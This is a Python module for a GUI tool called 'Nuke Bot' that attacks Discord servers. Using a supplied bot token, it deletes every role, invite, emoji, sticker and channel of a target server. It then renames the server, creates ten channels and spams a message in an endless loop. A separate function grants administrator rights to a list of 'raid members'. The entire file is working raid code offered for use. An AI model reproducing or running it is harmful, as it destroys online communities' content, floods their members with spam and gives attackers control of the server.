import time
import random
import tkinter
import requests
import threading
from modules import _utils

module_status = False

def delete_roles(guild_id, headers):
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
    print(response.status_code, response.text)
    if response.status_code == 200:
        for role in response.json():
            if role['id'] != guild_id:
                response = requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', headers=headers)
                print(response.status_code, response.text)

def delete_invites(guild_id, headers):
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/invites', headers=headers)
    print(response.status_code, response.text)
    if response.status_code == 200:
        for invite in response.json():
            response = requests.delete(f'https://discord.com/api/v9/invites/{invite["code"]}', headers=headers)
            print(response.status_code, response.text)

def delete_emojis(guild_id, headers):
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/emojis', headers=headers)
    print(response.status_code, response.text)
    if response.status_code == 200:
        for emoji in response.json():
            response = requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji["id"]}', headers=headers)
            print(response.status_code, response.text)

def delete_stickers(guild_id, headers):
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/stickers', headers=headers)
    print(response.status_code, response.text)
    if response.status_code == 200:
        for sticker in response.json():
            response = requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/stickers/{sticker["id"]}', headers=headers)
            print(response.status_code, response.text)

def delete_channels(guild_id, headers):
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
    print(response.status_code, response.text)
    if response.status_code == 200:
        for channel in response.json():
            response = requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
            print(response.status_code, response.text)

def start(token, guild_id, new_guild_name, new_channel_name, message):
    global module_status
    module_status = True

    headers = {'Authorization': f'Bot {token}'}

    response = requests.get('https://discord.com/api/v9', headers=headers)
    print(response.status_code, response.text)

    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    print(response.status_code, response.text)
    if response.status_code == 200:
        application = response.json()
        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
        print(response.status_code, response.text)
        if response.status_code == 200:
            guild = response.json()
            print(f'Target: {guild["name"]}')

            manager = _utils.threading_manager()
            manager.start(target=delete_roles, args=(guild_id, headers))
            manager.start(target=delete_invites, args=(guild_id, headers))
            manager.start(target=delete_emojis, args=(guild_id, headers))
            manager.start(target=delete_stickers, args=(guild_id, headers))
            manager.start(target=delete_channels, args=(guild_id, headers))
            manager.join(True, True)

            request_data = {'name':new_guild_name}
            response = requests.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, json=request_data)
            print(response.status_code, response.text)

            created_channels = []
            request_data = {'name':new_channel_name,'type':0}
            for i in range(10):
                response = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json=request_data)
                print(response.status_code, response.text)
                if response.status_code == 201:
                    created_channels.append(response.json()['id'])

            while module_status:
                channel = random.choice(created_channels)
                message = message.replace('<RANDOM>', _utils.random_string(15, 5))
                request_data = {'content':message}
                response = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages', headers=headers, json=request_data)
                print(response.status_code, response.text)
                if response.status_code == 429:
                    time.sleep(response.headers['X-RateLimit-Reset-After'])

def stop():
    global module_status
    module_status = False

def give_permissions(token, guild_id, members):
    headers = {'Authorization': f'Bot {token}'}

    request_data = {'name':'新しいロール','permissions':8}
    response = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json=request_data)
    print(response.status_code, response.text)
    if response.status_code == 200:
        role = response.json()
        members = members.split(',')
        for member in members:
            response = requests.put(f'https://discord.com/api/v9/guilds/{guild_id}/members/{member}/roles/{role["id"]}', headers=headers)
            print(response.status_code, response.text)

def draw_module(module_frame):
    token = tkinter.StringVar()
    guild_id = tkinter.StringVar()
    new_guild_name = tkinter.StringVar()
    new_channel_name = tkinter.StringVar()
    message = tkinter.StringVar()
    raid_members = tkinter.StringVar()

    tkinter.Label(master=module_frame, text='Token', foreground='#ffffff', background='#2c2f33').pack()
    tkinter.Entry(master=module_frame, textvariable=token, width=50).pack()
    tkinter.Label(master=module_frame, text='Guild ID', foreground='#ffffff', background='#2c2f33').pack()
    tkinter.Entry(master=module_frame, textvariable=guild_id, width=50).pack()
    tkinter.Label(master=module_frame, background='#2c2f33').pack()
    tkinter.Label(master=module_frame, text='Guild Name', foreground='#ffffff', background='#2c2f33').pack()
    tkinter.Entry(master=module_frame, textvariable=new_guild_name, width=50).pack()
    tkinter.Label(master=module_frame, text='Channel Name', foreground='#ffffff', background='#2c2f33').pack()
    tkinter.Entry(master=module_frame, textvariable=new_channel_name, width=50).pack()
    tkinter.Label(master=module_frame, text='Message', foreground='#ffffff', background='#2c2f33').pack()
    tkinter.Entry(master=module_frame, textvariable=message, width=50).pack()
    tkinter.Button(master=module_frame, text='Start', width=10, foreground='#ffffff', background='#2c2f33', command=lambda:threading.Thread(target=start, args=(token.get(),guild_id.get(),new_guild_name.get(),new_channel_name.get(),message.get())).start()).pack()
    tkinter.Button(master=module_frame, text='Stop', width=10, foreground='#ffffff', background='#2c2f33', command=stop).pack()
    tkinter.Label(master=module_frame, background='#2c2f33').pack()
    tkinter.Label(master=module_frame, text='Raid Members', foreground='#ffffff', background='#2c2f33').pack()
    tkinter.Entry(master=module_frame, textvariable=raid_members, width=50).pack()
    tkinter.Button(master=module_frame, text='Give Permissions', width=15, foreground='#ffffff', background='#2c2f33', command=lambda:threading.Thread(target=give_permissions, args=(token.get(),guild_id.get(),raid_members.get())).start()).pack()

module = {
    'name':'Nuke Bot',
    'description':'サーバーをNukeします'
}